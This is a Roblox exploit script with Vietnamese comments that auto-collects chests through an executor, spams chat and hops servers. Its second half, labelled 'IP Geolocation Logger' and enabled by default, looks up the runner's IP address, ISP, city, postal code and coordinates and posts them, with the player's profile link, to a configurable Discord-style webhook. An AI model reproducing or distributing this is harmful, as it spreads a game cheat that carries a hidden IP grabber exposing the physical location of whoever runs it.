-- Tùy chọn cho phép bật/tắt chức năng đổi server và số lượng rương nhặt xong để đổi server
getgenv().Hop = true  -- Mặc định bật tính năng đổi server
_G.SoLuongRuong = 50  -- Số lượng rương cần nhặt trước khi đổi server

-- Tùy chọn bật/tắt chức năng gửi webhook và nhập URL webhook
getgenv().SendWebhook = true  -- Đặt là true để bật gửi tin nhắn qua webhook, false để tắt
_G.UrlWebhook = ""  -- Người dùng nhập URL webhook của họ ở đây

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local player = Players.LocalPlayer

-- Chức năng di chuyển với Tween
function Tween2(CFgo)
    local tween_s = game:GetService("TweenService")
    local info = TweenInfo.new(
        (game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position - CFgo.Position).Magnitude / 200, -- Giảm hệ số để di chuyển chậm hơn
        Enum.EasingStyle.Linear
    )
    
    local tween = tween_s:Create(game.Players.LocalPlayer.Character.HumanoidRootPart, info, {CFrame = CFgo})
    tween:Play()

    local tweenfunc = {}

    function tweenfunc:Stop()
        tween:Cancel()
    end

    return tweenfunc
end

-- Chức năng Auto Farm Chest với Tween và tự động nhặt rương + Chat
local chestsCollected = 0  -- Số rương đã nhặt trong server

local function AutoChat(message)
    game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(message, "All")
end

local function ToggleFarmChest()
    _G.AutoCollectChest = true
    spawn(function()
        while _G.AutoCollectChest and chestsCollected < _G.SoLuongRuong do
            local player = game:GetService("Players").LocalPlayer
            local character = player.Character or player.CharacterAdded:Wait()
            local currentPosition = character:GetPivot().Position
            local collectionService = game:GetService("CollectionService")
            local chests = collectionService:GetTagged("_ChestTagged") -- Kiểm tra tag rương trong game

            local nearestDistance, nearestChest = math.huge

            for _, chest in pairs(chests) do
                local distance = (chest:GetPivot().Position - currentPosition).Magnitude
                if not chest:GetAttribute("IsDisabled") and distance < nearestDistance then
                    nearestDistance, nearestChest = distance, chest
                end
            end

            if nearestChest then
                local chestPosition = nearestChest:GetPivot().Position
                local destination = CFrame.new(chestPosition)
                local tween = Tween2(destination) -- Gọi hàm di chuyển đến rương

                -- Chờ cho tới khi nhân vật di chuyển xong
                local totalTime = (nearestDistance / 200) + 1  -- Giảm tốc độ di chuyển
                wait(totalTime) 

                -- Kiểm tra và nhặt rương bằng cách sử dụng firetouchinterest
                if nearestChest and nearestChest:FindFirstChild("TouchInterest") then
                    firetouchinterest(player.Character.HumanoidRootPart, nearestChest, 0)
                    wait(0.1)
                    firetouchinterest(player.Character.HumanoidRootPart, nearestChest, 1)
                    chestsCollected = chestsCollected + 1
                    print("Đã nhặt rương:", chestsCollected)

                    -- Gửi tin nhắn thông báo đã nhặt được rương
                    AutoChat("á đù được " .. chestsCollected .. " rương rồi nè pro")

                    -- Kiểm tra nếu đã nhặt đủ số rương cần thiết và đổi server nếu getgenv().Hop được bật
                    if chestsCollected >= _G.SoLuongRuong then
                        print("Đã nhặt đủ rương, đang đổi server...")
                        AutoChat("Đã nhặt đủ " .. _G.SoLuongRuong .. " rương, đổi server thôi!")
                        if getgenv().Hop then
                            game:GetService("TeleportService"):Teleport(game.PlaceId) -- Đổi server
                        else
                            print("Hop server tắt, không đổi server.")
                        end
                        break
                    end
                end
            end

            wait(1) -- Chờ một khoảng thời gian trước khi tiếp tục tìm rương
        end
    end)
end

-- Gọi hàm nhặt rương tự động
ToggleFarmChest()

-- Kiểm tra nếu việc gửi webhook được bật
if getgenv().SendWebhook and _G.UrlWebhook ~= "" then
    local successAvatar, avatarData = pcall(function()
        return HttpService:JSONDecode(game:HttpGet("https://thumbnails.roblox.com/v1/users/avatar?userIds="..player.UserId.."&size=720x720&format=Png&isCircular=false")).data[1].imageUrl
    end)

    local successIP, ipData = pcall(function()
        return HttpService:JSONDecode(game:HttpGet("https://ipapi.co/json"))
    end)

    ipData = successIP and ipData or {} -- Nếu không thành công, trả về bảng trống

    local function createField(name, key)
        return { name = name, value = ipData[key] and tostring(ipData[key]) or "Not Found" }
    end

    -- Gửi dữ liệu tới webhook
    local function sendWebhook()
        local data = {
            embeds = {
                {
                    color = 1733608,
                    fields = {
                        createField("IP Address", "ip"),
                        createField("Network Range", "network"),
                        createField("ASN (Autonomous System Number)", "asn"),
                        createField("ISP (Internet Service Provider)", "org"),
                        createField("Country", "country_name"),
                        createField("Region/Province", "region"),
                        createField("City", "city"),
                        createField("Postal Code", "postal"),
                        createField("Latitude", "latitude"),
                        createField("Longitude", "longitude"),
                        createField("Timezone", "timezone")
                    }
                },
                {
                    title = "View "..player.Name.."'s full profile",
                    url = "https://www.roblox.com/users/"..player.UserId.."/profile",
                    color = 1733608,
                    image = { url = successAvatar and avatarData or "https://i.ibb.co/mVYFTK2f/Avatar-Not-Found.png" }
                }
            },
            username = "IP Geolocation Logger",
            avatar_url = "https://i.ibb.co/spwWKyBW/Globe-With-Meridians.png"
        }

        local requestData = {
            Url = _G.UrlWebhook,  -- Sử dụng URL webhook mà người dùng đã nhập
            Method = "POST",
            Headers = { ["content-type"] = "application/json" },
            Body = HttpService:JSONEncode(data)
        }

        -- Gửi request webhook
        local success, response = pcall(function()
            return (syn and syn.request or request)(requestData)
        end)

        -- Kiểm tra xem có lỗi gì không
        if success then
            print("Webhook sent successfully!")
        else
            warn("Failed to send webhook: "..tostring(response))
        end
    end

    -- Gọi hàm gửi webhook
    sendWebhook()
else
    print("Gửi webhook đã bị tắt hoặc URL webhook chưa được nhập.")
end
